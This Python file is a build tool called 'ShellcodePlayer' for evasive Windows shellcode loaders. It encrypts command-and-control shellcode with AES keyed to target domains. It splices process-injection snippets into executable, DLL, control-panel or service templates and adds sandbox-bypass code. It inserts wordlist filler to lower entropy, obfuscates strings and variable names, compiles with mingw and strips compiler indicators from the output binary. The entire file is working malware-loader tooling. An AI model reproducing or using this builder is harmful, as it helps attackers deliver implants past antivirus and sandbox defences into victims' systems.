from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
from termcolor import colored
from datetime import date
import subprocess
import argparse
import hashlib
import random
import string
import shutil
import pefile
import glob
import json
import os
import re
import sys
from pathlib import Path

timestamp = date.today()

Projectname = "ShellcodePlayer"
Version = "0.1"

exe_args=" -lEXE "
dll_args=" -lDLL "
service_args=" -lSERVICE "
cpl_args=" -lCPL "

Red = '\033[91m'
Green = '\033[92m'
Blue = '\033[94m'
Cyan = '\033[96m'
White = '\033[97m'
Yellow = '\033[93m'
Magenta = '\033[95m'
Grey = '\033[90m'
Black = '\033[90m'
Default = '\033[99m'

def parse_args():
	parser = argparse.ArgumentParser(description="{Projectname}", add_help=False)
	parser.add_argument('-h', '--help', action='store_true', help='Show help')
	parser.add_argument('-o', '--output',  help='Output directory to save project')
	parser.add_argument('-c', '--config', type=str, help='Full path to configuration file')
	parser.add_argument('-sc', '--save_config', type=str, help='Save options to configuration file')
	parser.add_argument('-a', '--arch', choices=['x64', 'x86'], help='Shellcode architecture (x64 или x86)')
	parser.add_argument('-w', '--wordlist', nargs='*', choices=get_wordlists(), help='Wordlist to embed to loader')				# One or more
	parser.add_argument('-d', '--domains', nargs='*', help='One or more domains that will be used as AES key for shellcode')	# One or more
	parser.add_argument('-s', '--sign', type=str, help='Choose script for signing loader')
	parser.add_argument('-f', '--format', choices=['exe', 'service', 'dll', 'cpl'], help='Output format')
	parser.add_argument('-c2f', '--c2_fast', type=str, help='Full path to shellcode with fast C2 channel')
	parser.add_argument('-c2m', '--c2_medium', type=str, help='Full path to shellcode with medium C2 channel')
	parser.add_argument('-c2s', '--c2_slow', type=str, help='Full path to shellcode with slow C2 channel')
	parser.add_argument('-ff', '--fork_fast', type=str, help='Name of process to spawn for fast c2')
	parser.add_argument('-fm', '--fork_medium', type=str, help='Name of process to spawn for medium c2')
	parser.add_argument('-fs', '--fork_slow', type=str, help='Name of process to spawn for slow c2')

	parser.add_argument('--debug', action='store_true', help='Enable debug mode')

	parser.add_argument('-b', '--bypass', nargs='*',  help='Choose one ore more strategy for sandbox bypass')					# One or more
	parser.add_argument('--control', nargs='*', help='Choose one ore more strategy for payload control')						# One or more
	parser.add_argument('--AllocMemory', choices=get_available_injection_snippets('AllocMemory'))
	parser.add_argument('--ExecuteMemory', choices=get_available_injection_snippets('ExecuteMemory'))
	parser.add_argument('--ProcessCreate', choices=get_available_injection_snippets('ProcessCreate'))
	parser.add_argument('--ProcessOpen', choices=get_available_injection_snippets('ProcessOpen'))
	parser.add_argument('--ProtectMemory', choices=get_available_injection_snippets('ProtectMemory'))
	parser.add_argument('--WriteMemory', choices=get_available_injection_snippets('WriteMemory'))
	args, unknown = parser.parse_known_args()
	if args.help:
		show_help()
		sys.exit(0)
	if unknown:
		parser.error(f"Unrecognized arguments: {', '.join(unknown)}")
	return args

def get_available_domain_snippets():
	path = f"Snippets/Preload/DomainRetrive/*.c"
	snippets = [os.path.basename(f)[:-2] for f in glob.glob(path)]
	return snippets

def get_available_injection_snippets(category):
	path = f"Snippets/Injection/{category}/*.c"
	snippets = [os.path.basename(f)[:-2] for f in glob.glob(path)]
	return snippets

def get_available_bypass_snippets():
	path = f"Snippets/Preload/Bypass/*.c"
	snippets = [os.path.basename(f)[:-2] for f in glob.glob(path)]
	return snippets

def get_available_control_snippets():
	path = f"Snippets/Preload/Control/*.c"
	snippets = [os.path.basename(f)[:-2] for f in glob.glob(path)]
	return snippets

def get_wordlists():
	path = "Misc/Wordlists/*"
	wordlists = [os.path.splitext(os.path.basename(f))[0] for f in glob.glob(path)]
	return wordlists

def show_help():
	print(f"\nUsage: python {Projectname}.py [options]\n")
	print("Options:")
	print(f"  -h, --help \t\tShow help")
	print(f"  -o, --output \t\tOutput folder")
	print(f"  -c, --config \t\tLoad options from configuration file")
	print(f"  -sc, --save_config \tSave options to configuration file")
	print(f"  -a, --arch \t\tShellcode arch. Options:")
	print(f"\t\t\t\033[90mx64\033[0m")
	print(f"\t\t\t\033[90mx86\033[0m")
	print(f"\t\t\t\033[90mx64_x86\033[0m")
	print(f"\n  -w, --wordlist \tOne or more dictionaries to insert into the loader. Options:")
	wordlists = get_wordlists()
	for wordlist in wordlists:
		print(f"\t\t\t\033[90m{wordlist}\033[0m")
	print(f"\n  -d, --domains \tOne or more domains that will be used as AES key")
	print(f"  -s, --sign \t\tChoose script for signing loader. Options:")
	print(f"  -f, --format \t\tChoose output format. Options:")
	print(f"\t\t\t\033[90mexe\033[0m")
	print(f"\t\t\t\033[90mdll\033[0m")
	print(f"\t\t\t\033[90mcpl\033[0m")
	print(f"\t\t\t\033[90mservice\033[0m")
	print(f"\n  -c2f, --c2_fast \tFull path to shellcode with fast C2 channel")
	print(f"  -c2m, --c2_medium \tFull path to shellcode with medium C2 channel")
	print(f"  -c2s, --c2_slow \tFull path to shellcode with slow C2 channel")
	print(f"\n  -ff, --fork_fast \tName of process to spawn for fast c2")
	print(f"  -fm, --fork_medium \tName of process to spawn for medium c2")
	print(f"  -fs, --fork_slow \tName of process to spawn for slow c2")




	print(f"\n  -b, --bypass \t\tChoose one ore more strategy for sandbox bypass. Options:")
	snippets = get_available_bypass_snippets()
	for snippet in snippets:
		with open(f"Snippets/Preload/Bypass/{snippet}.c", "r") as file:
			description = "No description"
			for line in file:
				if line.startswith("// Description:"):
					description = line[len("// Description:"):].strip()
					if not description:
						description = "No description"
					break
			print(f"\t\t\t\033[90m{snippet} ({description})\033[0m")

	print(f"\n  --control \t\tChoose one ore more strategy for payload control. Options:")
	snippets = get_available_control_snippets()
	for snippet in snippets:
		with open(f"Snippets/Preload/Control/{snippet}.c", "r") as file:
			description = "No description"
			for line in file:
				if line.startswith("// Description:"):
					description = line[len("// Description:"):].strip()
					if not description:
						description = "No description"
					break
			print(f"\t\t\t\033[90m{snippet} ({description})\033[0m")
	print(f"\n  --ProcessCreate \tSnippet for crettion new process. Options:")
	snippets = get_available_injection_snippets("ProcessCreate")
	for snippet in snippets:
		with open(f"Snippets/Injection/ProcessCreate/{snippet}.c", "r") as file:
			description = "No description"
			for line in file:
				if line.startswith("// Description:"):
					description = line[len("// Description:"):].strip()
					break
		print(f"\t\t\t\033[90m{snippet} ({description})\033[0m")
	print(f"\n  --ProcessOpen \tSnippet for get process handle. Options:")
	snippets = get_available_injection_snippets("ProcessOpen")
	for snippet in snippets:
		with open(f"Snippets/Injection/ProcessOpen/{snippet}.c", "r") as file:
			description = "No description"
			for line in file:
				if line.startswith("// Description:"):
					description = line[len("// Description:"):].strip()
					break
		print(f"\t\t\t\033[90m{snippet} ({description})\033[0m")
	print(f"\n  --AllocMemory \tSnippet for memory allocation in remote process. Options:")
	snippets = get_available_injection_snippets("AllocMemory")
	for snippet in snippets:
		with open(f"Snippets/Injection/AllocMemory/{snippet}.c", "r") as file:
			description = "No description"
			for line in file:
				if line.startswith("// Description:"):
					description = line[len("// Description:"):].strip()
					break
		print(f"\t\t\t\033[90m{snippet} ({description})\033[0m")
	print(f"\n  --WriteMemory \tSnippet for write memory to allocated region of memory. Options:")
	snippets = get_available_injection_snippets("WriteMemory")
	for snippet in snippets:
		with open(f"Snippets/Injection/WriteMemory/{snippet}.c", "r") as file:
			description = "No description"
			for line in file:
				if line.startswith("// Description:"):
					description = line[len("// Description:"):].strip()
					break
		print(f"\t\t\t\033[90m{snippet} ({description})\033[0m")
	print(f"\n  --ProtectMemory \tSnippet change memory protection from RW to RX. Options:")
	snippets = get_available_injection_snippets("ProtectMemory")
	for snippet in snippets:
		with open(f"Snippets/Injection/ProtectMemory/{snippet}.c", "r") as file:
			description = "No description"
			for line in file:
				if line.startswith("// Description:"):
					description = line[len("// Description:"):].strip()
					break
		print(f"\t\t\t\033[90m{snippet} ({description})\033[0m")

	print(f"\n  --ExecuteMemory \tSnippet for executing memory. Options:")
	snippets = get_available_injection_snippets("ExecuteMemory")
	for snippet in snippets:
		with open(f"Snippets/Injection/ExecuteMemory/{snippet}.c", "r") as file:
			description = "No description"
			for line in file:
				if line.startswith("// Description:"):
					description = line[len("// Description:"):].strip()
					break
		print(f"\t\t\t\033[90m{snippet} ({description})\033[0m")


	print(f"\nExample: python3 {Projectname}.py {Grey} -d example.local -c default.conf --c2_fast /Users/user/Desktop/Work/2.Project/Payloads/Shellcodes/12.fast_30_ekko_syscall_syscall_noproxy.bin  --fork_fast 'C:\\\Windows\\\system32\\\\notepad.exe' -w APT28  --AllocMemory VirtualAllocEx_Dyn -f cpl -sc test.json {White}\n")

def validate_args(args):
	obligatory_args = ['AllocMemory', 'ExecuteMemory', 'ProcessCreate', 'ProcessOpen', 'ProtectMemory', 'WriteMemory', 'arch', 'domains', 'format', 'c2_fast', 'fork_fast']
	missing_args = [arg for arg in obligatory_args if not getattr(args, arg)]
	if missing_args:
		print(f"\n\033[91m[-] Error: Missing required arguments:\033[0m", ", ".join(missing_args), "\n")
		show_help()
		sys.exit(1)

def parse_config(config_path):
	with open(config_path, "r") as config_file:
		config_data = json.load(config_file)
	return config_data

def generate_random_var_name(length=20):
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(length))

def create_wordlist_header_files(wordlists, path_to_wordlists, path_to_output):
	if not os.path.exists(path_to_output):
		os.makedirs(path_to_output)
	with open(f"{path_to_output}/EntropyDecrease.h", "w") as file:
		file.write('#ifndef ENTROPY_DECREASE\n#define ENTROPY_DECREASE\n\n')
		for wordlist in wordlists:
			try:
				with open(f"{path_to_wordlists}/{wordlist}", "r") as wl_file:
					words = wl_file.readlines()
				if not words:
					continue
				percentage = random.uniform(0.1, 0.3)  # Generate a random percentage between 30% and 50%
				words = random.sample(words, k=int(len(words) * percentage))  # Select words
				for word in words:
					var_name = generate_random_var_name()
					var_value = word.strip()
					file.write(f'const char * {var_name} = "{var_value}";\n')
			except FileNotFoundError:
				print(f"Error: File {wordlist} not found in directory {path_to_wordlists}.")
				continue
		file.write('\n#endif // ENTROPY_DECREASE\n')

def obfuscate_words(src_files, target_words, domains):
	def random_string(length):
		letters = string.ascii_letters
		return ''.join(random.choice(letters) for i in range(length))
	replacements = {}
	for i, domain in enumerate(domains, start=1):
		for target_word in target_words:
			key = f'{target_word}_{i}'
			replacements[key] = random_string(15)
	for src_file in src_files:
		text = Path(src_file).read_text()
		for target, replacement in replacements.items():
			pattern = re.compile(target)
			text = pattern.sub(replacement, text)
		Path(src_file).write_text(text)

def prepare_project(args):
	domain_count = 0
	tmp_dir = 'tmp'
	if os.path.exists(tmp_dir):
		for root, dirs, files in os.walk(tmp_dir):
			for file in files:
				os.remove(os.path.join(root, file))
			for dir in dirs:
				shutil.rmtree(os.path.join(root, dir))
	else:
		os.mkdir(tmp_dir)
	for domain in args.domains:
		domain_count = domain_count + 1
		tmp1 = ""
		tmp2 = ""
		tmp3 = ""
		if args.c2_fast and args.fork_fast:
			tmp1 = bin_to_aes_shellcode(args.c2_fast, domain, f"shellcode_fast_{domain_count}")
			#tmp1 = create_shellcode_from_bin(args.c2_fast, f"shellcode_fast_{domain_count}")
		if args.c2_medium and args.fork_medium:
			tmp2 = bin_to_aes_shellcode(args.c2_medium, domain, f"shellcode_medium_{domain_count}")
			#tmp2 = create_shellcode_from_bin(args.c2_medium, f"shellcode_medium_{domain_count}")
		if args.c2_slow and args.fork_slow:
			tmp3 = bin_to_aes_shellcode(args.c2_slow, domain, f"shellcode_slow_{domain_count}")
			#tmp3 = create_shellcode_from_bin(args.c2_slow, f"shellcode_slow_{domain_count}")

		tmp4 = tmp1 + "\n" + tmp2 + "\n" + tmp3 + "\n"
		with open(os.path.join(tmp_dir, 'Shellcode.h'), 'a') as f:
			f.write(tmp4)
	if args.fork_fast:
		tmp = f"\n#define PROC_TO_INJECT_FAST \"" + args.fork_fast + "\""
		with open(os.path.join(tmp_dir, 'Shellcode.h'), 'a') as f:
			f.write(tmp)

	if args.fork_medium:
		tmp = f"\n#define PROC_TO_INJECT_MEDIUM \"" + args.fork_medium + "\""
		with open(os.path.join(tmp_dir, 'Shellcode.h'), 'a') as f:
			f.write(tmp)

	if args.fork_slow:
		tmp = f"\n#define PROC_TO_INJECT_SLOW \"" + args.fork_slow + "\""
		with open(os.path.join(tmp_dir, 'Shellcode.h'), 'a') as f:
			f.write(tmp)

	if args.format == "exe":
		shutil.copyfile("Template/exe.c", "tmp/Main.c")
	if args.format == "cpl":
		shutil.copyfile("Template/cpl.c", "tmp/Main.c")
	if args.format == "dll":
		shutil.copyfile("Template/dll.c", "tmp/Main.c")
	if args.format == "service":
		shutil.copyfile("Template/service.c", "tmp/Main.c")

	# Replace injection snippets in main.c
	with open('Template/aes.c', 'r') as f:
		tmp_content = f.read()
	with open('tmp/main.c', 'r') as f:
		main_content = f.read()
	main_content = main_content.replace('// AESDecrypt_replace', tmp_content)
	with open('tmp/main.c', 'w') as f:
		f.write(main_content)

	with open("Snippets/Injection/ProcessCreate/" + args.ProcessCreate + ".c", 'r') as f:
		tmp_content = f.read()
	with open('tmp/main.c', 'r') as f:
		main_content = f.read()

	main_content = main_content.replace('// ProcessCreate_replace', tmp_content)
	with open('tmp/main.c', 'w') as f:
		f.write(main_content)

	with open("Snippets/Injection/ProcessOpen/" + args.ProcessOpen + ".c", 'r') as f:
		tmp_content = f.read()
	with open('tmp/main.c', 'r') as f:
		main_content = f.read()
	main_content = main_content.replace('// ProcessOpen_replace', tmp_content)
	with open('tmp/main.c', 'w') as f:
		f.write(main_content)

	with open("Snippets/Injection/AllocMemory/" + args.AllocMemory + ".c", 'r') as f:
		tmp_content = f.read()
	with open('tmp/main.c', 'r') as f:
		main_content = f.read()
	main_content = main_content.replace('// AllocMemory_replace', tmp_content)
	with open('tmp/main.c', 'w') as f:
		f.write(main_content)

	with open("Snippets/Injection/WriteMemory/" + args.WriteMemory + ".c", 'r') as f:
		tmp_content = f.read()
	with open('tmp/main.c', 'r') as f:
		main_content = f.read()
	main_content = main_content.replace('// WriteMemory_replace', tmp_content)
	with open('tmp/main.c', 'w') as f:
		f.write(main_content)

	with open("Snippets/Injection/ProtectMemory/" + args.ProtectMemory + ".c", 'r') as f:
		tmp_content = f.read()
	with open('tmp/main.c', 'r') as f:
		main_content = f.read()
	main_content = main_content.replace('// ProtectMemory_replace', tmp_content)
	with open('tmp/main.c', 'w') as f:
		f.write(main_content)


	with open("Snippets/Injection/ExecuteMemory/" + args.ExecuteMemory + ".c", 'r') as f:
		tmp_content = f.read()
	with open('tmp/main.c', 'r') as f:
		main_content = f.read()
	main_content = main_content.replace('// ExecuteMemory_replace', tmp_content)
	with open('tmp/main.c', 'w') as f:
		f.write(main_content)

	# modify main.c to try to decrypt all shellcodes with current domain
	domain_count = 0
	output_fast = ""
	output_medium = ""
	output_slow = ""
	for domain in args.domains:
		domain_count = domain_count + 1
		if args.c2_fast and args.fork_fast:
			output_fast += f"\t\tgo(PROC_TO_INJECT_FAST, shellcode_fast_{domain_count}, sizeof(shellcode_fast_{domain_count}));\n"
		if args.c2_medium and args.fork_medium:
			output_medium += f"\t\tgo(PROC_TO_INJECT_MEDIUM, shellcode_medium_{domain_count}, sizeof(shellcode_medium_{domain_count}));\n"
		if args.c2_slow and args.fork_slow:
			output_slow += f"\t\tgo(PROC_TO_INJECT_SLOW, shellcode_slow_{domain_count}, sizeof(shellcode_slow_{domain_count}));\n"
	with open('tmp/main.c', 'r') as file:
		filedata = file.read()
	filedata = filedata.replace('// fast_section_replace', output_fast)
	filedata = filedata.replace('// medium_section_replace', output_medium)
	filedata = filedata.replace('// slow_section_replace', output_slow)
	with open('tmp/main.c', 'w') as file:
		file.write(filedata)

	# Add trash variables from wordlists
	if args.wordlist:
		create_wordlist_header_files(args.wordlist, "Misc/Wordlists", "tmp")
	else:
		create_wordlist_header_files(['None'], "Misc/Wordlists", "tmp")

	# Copy controls
	if args.control:
		file_contents = []
		for control_realization in args.control:
			with open(os.path.join('Snippets/Preload/Control', control_realization + ".c"), 'r') as file:
				file_contents.append(file.read().replace("\\", "\\\\"))
		replacement_text = '\n'.join(file_contents)
		with open('tmp/main.c', 'r') as file:
			main_c_contents = file.read()
		main_c_contents = re.sub('// Control_replace', replacement_text, main_c_contents)
		with open('tmp/main.c', 'w') as file:
			file.write(main_c_contents)

	# Copy bypasses
	if args.bypass:
		file_contents = []
		for bypass_realization in args.bypass:
			with open(os.path.join('Snippets/Preload/Bypass', bypass_realization + ".c"), 'r') as file:
				file_contents.append(file.read().replace("\\", "\\\\"))
		replacement_text = '\n'.join(file_contents)
		with open('tmp/main.c', 'r') as file:
			main_c_contents = file.read()
		main_c_contents = re.sub('// Bypass_replace', replacement_text, main_c_contents)
		with open('tmp/main.c', 'w') as file:
			file.write(main_c_contents)

	src_files = ['tmp/Shellcode.h', 'tmp/Main.c']
	target_words = ['shellcode_fast', 'shellcode_medium', 'shellcode_slow']
	obfuscate_words(src_files, target_words, args.domains)

	pass

def bin_to_aes_shellcode(path_to_bin, key, variable_name):
	KEY = hashlib.sha256(key.encode()).digest()
	iv = 16 * b'\x00'
	cipher = AES.new(KEY, AES.MODE_CBC, iv)
	try:
		plaintext = open(path_to_bin, "rb").read()
	except:
		sys.exit()
	ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
	debug_info = "\n// [DEBUG] Path to binary: " + path_to_bin + "\n"
	debug_info += "// [DEBUG] Key: " + key + "\n"
	debug_info += "// [DEBUG] Variable Name: " + variable_name + "\n"
	debug_info += "// [DEBUG] Shellcode size before encryption: %d\n" % len(plaintext)
	debug_info += "// [DEBUG] Shellcode size after encryption: %d\n" % len(ciphertext)
	var_name = variable_name
	output = "unsigned char %s[] = {" % var_name
	for x in ciphertext:
		output += "0x%02x, " % x
	output = output[:-2] + "};"
	return debug_info + output

def create_shellcode_from_bin(path_to_bin, variable_name):
	process = subprocess.Popen(['hexdump', '-v', '-e', r'"\\x" 1/1 "%02x"', path_to_bin], stdout=subprocess.PIPE)
	output, _ = process.communicate()
	shellcode = output.decode().replace('\n', '')
	c_variable = f'char {variable_name}[] = "{shellcode}";'
	return c_variable

def show_project_info(args):
	print(f"\n{Grey}#################### {White} Build info {Grey} #####################{Default}\n")
	print(f"\033[92m[+]\033[0m Date: {Grey}------------------------> {White}{timestamp}{Default}")
	print(f"\033[92m[+]\033[0m Output: {Grey}----------------------> {White}{args.output}{Default}")
	print(f"\033[92m[+]\033[0m Output format: {Grey}---------------> {White}{args.format}{Default}")
	print(f"\033[92m[+]\033[0m Arch: {Grey}------------------------> {White}{args.arch}{Default}")
	print(f"\033[92m[+]\033[0m Wordlists to embed: {Grey}----------> {White}{args.wordlist}{Default}")
	print(f"\033[92m[+]\033[0m Domains: {Grey}---------------------> {White}{args.domains}{Default}")
	print(f"\033[92m[+]\033[0m Sign: {Grey}------------------------> {White}{args.sign}{Default}")
	print(f"\033[92m[+]\033[0m C2 fast: {Grey}---------------------> {White}{args.c2_fast}{Default}")
	print(f"\033[92m[+]\033[0m C2 medium: {Grey}-------------------> {White}{args.c2_medium}{Default}")
	print(f"\033[92m[+]\033[0m C2 slow: {Grey}---------------------> {White}{args.c2_slow}{Default}")

	print(f"\033[92m[+]\033[0m Debug: {Grey}-----------------------> {White}{args.debug}{Default}")

	print(f"\033[92m[+]\033[0m C2 fast process: {Grey}-------------> {White}{args.fork_fast}{Default}")
	print(f"\033[92m[+]\033[0m C2 medium process: {Grey}-----------> {White}{args.fork_medium}{Default}")
	print(f"\033[92m[+]\033[0m C2 slow process: {Grey}-------------> {White}{args.fork_slow}{Default}")
	print(f"\033[92m[+]\033[0m Bypass strategy: {Grey}-------------> {White}{args.bypass}{Default}")
	print(f"\033[92m[+]\033[0m Control strategy: {Grey}------------> {White}{args.control}{Default}")

	print(f"\033[92m[+]\033[0m ProcessCreate: {Grey}---------------> {White}{args.ProcessCreate}{Default}")
	print(f"\033[92m[+]\033[0m ProcessOpen: {Grey}-----------------> {White}{args.ProcessOpen}{Default}")
	print(f"\033[92m[+]\033[0m AllocMemory: {Grey}-----------------> {White}{args.AllocMemory}{Default}")
	print(f"\033[92m[+]\033[0m WriteMemory: {Grey}-----------------> {White}{args.WriteMemory}{Default}")
	print(f"\033[92m[+]\033[0m ProtectMemory: {Grey}---------------> {White}{args.ProtectMemory}{Default}")
	print(f"\033[92m[+]\033[0m ExecuteMemory: {Grey}---------------> {White}{args.ExecuteMemory}{Default}")
	print(f"\n{Grey}#################### {White} Exec flow {Grey} #####################{Default}")
	print(f"\n{White}{args.bypass}{Grey}-->{White}{args.control}{Grey}-->")

	print(f"{Grey}-->{White}QueryDomain{Grey} -->")
	domain_count = 0
	output_fast = ""
	output_medium = ""
	output_slow = ""
	for domain in args.domains:
		domain_count = domain_count + 1
		if args.c2_fast and args.fork_fast:
			print(f"		{Grey}-->{White}AESDecrypt {Grey}fast c2{White} shellcode (Key:{Grey} {domain}{White}){Grey} -->{White}{args.ProcessCreate} ({Grey}{args.fork_fast}{White}){Grey}-->{White}{args.ProcessOpen}{Grey}-->{White}{args.AllocMemory}{Grey}-->{White}{args.WriteMemory}{Grey}-->{White}{args.ProtectMemory}{Grey}-->{White}{args.ExecuteMemory}")
		if args.c2_medium and args.fork_medium:
			print(f"		{Grey}-->{White}AESDecrypt {Grey}medium c2{White} shellcode (Key:{Grey} {domain}{White}){Grey} -->{White}{args.ProcessCreate} ({Grey}{args.fork_medium}{White}){Grey}-->{White}{args.ProcessOpen}{Grey}-->{White}{args.AllocMemory}{Grey}-->{White}{args.WriteMemory}{Grey}-->{White}{args.ProtectMemory}{Grey}-->{White}{args.ExecuteMemory}")
		if args.c2_slow and args.fork_slow:
			print(f"		{Grey}-->{White}AESDecrypt {Grey}slow c2{White} shellcode (Key:{Grey} {domain}{White}){Grey} -->{White}{args.ProcessCreate} ({Grey}{args.fork_fast}{White}){Grey}-->{White}{args.AllocMemory}{Grey}-->{White}{args.WriteMemory}{Grey}-->{White}{args.ProtectMemory}{Grey}-->{White}{args.ExecuteMemory}")
	print("")



	pass

def tmp_move1():
	src_dir = "tmp"
	dst_dir = "tmp/src/"
	build_dir = "tmp/build/"
	if not os.path.exists(dst_dir):
		os.makedirs(dst_dir)
	for filename in os.listdir(src_dir):
		if filename != "src":
			src_file = os.path.join(src_dir, filename)
			dst_file = os.path.join(dst_dir, filename)
			shutil.move(src_file, dst_file)
	if not os.path.exists(build_dir):
		os.makedirs(build_dir)

def tmp_move2(args):
	if not os.path.exists(args.output):
		os.makedirs(args.output)
	for item in os.listdir('tmp/'):
		s = os.path.join('tmp/', item)
		d = os.path.join(args.output, item)
		if os.path.isdir(s):
			shutil.copytree(s, d, dirs_exist_ok=True)
		else:
			shutil.copy2(s, d)
	shutil.rmtree('tmp/')

def create_makefile(args, projectname):
	if args.arch == 'x64':
		compiler = "x86_64-w64-mingw32-gcc"
		compiler_args = " -Os -s -ffunction-sections -fno-asynchronous-unwind-tables -fno-ident -masm=intel -static-libgcc "
	elif args.arch == 'x86':
		compiler = "i686-w64-mingw32-gcc"
		compiler_args = " -Os -s -ffunction-sections -fno-asynchronous-unwind-tables -fno-ident "

	if not args.debug:
		compiler_args += "-mwindows "

	if args.format == 'cpl':
		compiler_args += "-shared "
		outformat = "cpl"
	if args.format == 'dll':
		compiler_args += "-shared "
		outformat = "dll"
	if args.format == 'exe':
		outformat = "exe"
	if args.format == 'service':
		outformat = "exe"

	if args.debug:
		compiler_args += "-DDEBUG "
	if args.c2_fast and args.fork_fast:
		compiler_args += "-DFASTC2 "
	if args.c2_medium and args.fork_medium:
		compiler_args += "-DMEDIUMC2 "
	if args.c2_slow and args.fork_slow:
		compiler_args += "-DSLOWC2 "
	makefile_content = f'''
all:
\t{compiler} {compiler_args} -o build/{projectname}.{outformat} src/*.c
	'''
	with open('tmp/Makefile', 'w') as f:
		f.write(makefile_content)

def run_make():
	print(f"{Grey}####################{White} Building {Grey}#####################{Grey}\n")
	cwd = os.getcwd()
	os.chdir("tmp")
	subprocess.run(["make"], check=True)
	os.chdir(cwd)

def analyze_pe_file(filename):
	try:
		pe = pefile.PE(filename)
	except FileNotFoundError:
		print(f"File not found: {filename}")
		return
	print(f"{Grey}\n####################{White} Basic Info {Grey}#################### {White}\n")
	print(f"File Name: {filename}")
	print(f"File Size: {pe.OPTIONAL_HEADER.SizeOfImage:,} bytes")
	print(f"Entry Point: {pe.OPTIONAL_HEADER.AddressOfEntryPoint:#x}")
	print(f"Number of Sections: {pe.FILE_HEADER.NumberOfSections}")
	print(f"{Grey}\n####################{White} Sections {Grey}#################### {White}\n")
	for section in pe.sections:
		section_name = section.Name.decode().strip('\x00')
		section_size = section.SizeOfRawData
		print(f"{section_name} - Size: {section_size}")
	print(f"{Grey}\n####################{White} WinAPIs {Grey}#################### {White}\n")
	for entry in pe.DIRECTORY_ENTRY_IMPORT:
		dll_name = entry.dll.decode().strip('\x00')
		print(f"{Green}[*]{White} {dll_name}" )
		for imp in entry.imports:
			if imp.name is not None:
				api_name = imp.name.decode().strip('\x00')
				print('\t' + dll_name + '----->' + api_name)
	print(f"{Grey}\n####################{White} Strings {Grey}#################### {White}\n")
	pattern = b"[\x1f-\x7f]{10,}"
	for section in pe.sections:
		data = section.get_data()
		strings = re.findall(pattern, data)
		for s in strings:
			print(s.decode(errors='ignore'))

def save_config(filename, args):
	args_dict = vars(args)
	#if 'c2_fast' in args_dict:
	#	del args_dict['c2_fast']
	#if 'c2_medium' in args_dict:
	#	del args_dict['c2_medium']
	#if 'c2_slow' in args_dict:
	#	del args_dict['c2_slow']
	if 'save_config' in args_dict:
		del args_dict['save_config']
	if 'config' in args_dict:
		del args_dict['config']
	if 'output' in args_dict:
		del args_dict['output']

	with open(filename, 'w') as outfile:
		json.dump(args_dict, outfile, indent=4)

def ioc_replace(file_path, target_string):
	with open(file_path, "rb") as f:
		data = f.read()
	data_str = data.decode('ISO-8859-1')
	occurrences = [m.start() for m in re.finditer(re.escape(target_string), data_str)]
	for start_index in occurrences:
		random_string = ''.join(random.choice(string.ascii_letters) for _ in range(len(target_string)))
		data_str = data_str[:start_index] + random_string + data_str[start_index + len(target_string):]
	data_bytes = data_str.encode('ISO-8859-1')
	with open(file_path, "wb") as f:
		f.write(data_bytes)

def obfuscate_strings(file_path):
	try:
		with open(file_path, 'r') as file:
			lines = file.readlines()
	except FileNotFoundError:
		print(f"File {file_path} not found.")
		return
	pattern = re.compile(r'(<obf>.*?<ob_end>)')
	unescaped_quotes = re.compile(r'(?<!\\)"')
	valid_char = re.compile(r'[^a-zA-Z0-9_]')
	new_lines = []
	for line in lines:
		matches = pattern.findall(line)
		if matches:
			for match in matches:
				entire_obf = match
				variable = entire_obf[5:-8]  # remove <obf> and <ob_end>
				variable = unescaped_quotes.sub('', variable)  # remove unescaped quotes
				random_letters = ''.join(random.choice(string.ascii_letters) for _ in range(20))
				array_name = valid_char.sub('_', variable) + random_letters
				array_declaration = f'char {array_name}[{len(variable) + 1}];\n'
				assignments = [f'{array_name}[{i}] = \'{c}\';' for i, c in enumerate(variable)]
				assignments.append(f'{array_name}[{len(variable)}] = 0;')
				random.shuffle(assignments)  # shuffle assignment lines
				array_assignment = '\n'.join(assignments) + '\n'
				array_declaration += array_assignment
				line = array_declaration + line.replace(entire_obf, array_name)
			new_lines.append(line)
		else:
			new_lines.append(line)
	with open(file_path, 'w') as file:
		for line in new_lines:
			file.write(line)

def main():
	projectname = ''.join(random.choices(string.ascii_letters, k=10))
	args = parse_args()
	config_data = {}
	if args.config:
		try:
			config_data = parse_config(args.config)
			for key, value in config_data.items():
				if hasattr(args, key):
					setattr(args, key, value)
		except FileNotFoundError:
			print("[!] Configuration file not found:", args.config)
			sys.exit(1)
		except Exception as e:
			print("[!] Something whent wrong:", e)
			sys.exit(1)
	validate_args(args)
	show_project_info(args)
	project_data = prepare_project(args)
	tmp_move1()
	create_makefile(args, projectname)

	obfuscate_strings("tmp/src/Main.c")

	run_make()

	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'test')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'GCC: (GNU) 12.1.0')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'Mingw-w64 runtime failure:')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'Address %p has no image-section')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'Argument domain error (DOMAIN)')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'Argument singularity (SIGN)')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'Overflow range error (OVERFLOW)')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'Partial loss of significance (PLOSS)')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'Total loss of significance (TLOSS)')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'The result is too small to be represented (UNDERFLOW)')

	ioc_replace(f'tmp/build/{projectname}.{args.format}', '  VirtualQuery failed for %d bytes at address %p')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', '  VirtualProtect failed with code 0x%x')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', '  Unknown pseudo relocation protocol version %d.')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', '  Unknown pseudo relocation bit size %d.')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', '%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p.')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', '_matherr(): %s in %s(%g, %g)  (retval=%g)')

	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'Unknown error')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'DllGetClassObject')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'DllRegisterServer')
	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'DllRegisterServerEx')
